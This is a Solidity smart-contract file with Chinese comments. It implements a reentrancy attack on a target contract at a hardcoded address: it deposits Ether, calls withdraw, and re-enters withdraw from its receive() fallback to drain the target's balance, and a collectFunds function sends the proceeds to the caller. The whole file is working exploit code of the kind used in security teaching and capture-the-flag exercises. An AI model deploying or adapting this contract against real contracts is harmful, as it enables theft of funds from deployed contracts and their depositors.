// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancyVulnerable {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract AttackReentrancy {
    IReentrancyVulnerable public vulnerableContract;

    // 构造函数，设置目标合约地址
    constructor() {
        vulnerableContract = IReentrancyVulnerable(address(0xFF16046765ADAf4bC867a0e38535e49639b7488d));
    }

    // 启动攻击：先存款然后开始提款
    function attack() public payable {
        require(msg.value > 0, "Send Ether to attack");

        // 先进行存款
        vulnerableContract.deposit{value: msg.value}();

        // 开始提款并重入攻击
        vulnerableContract.withdraw(msg.value);
    }

    // 被重入调用的回退函数
    receive() external payable {
        // 重入攻击：继续从受害合约提款
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }

    // 提取攻击合约中的以太币
    function collectFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
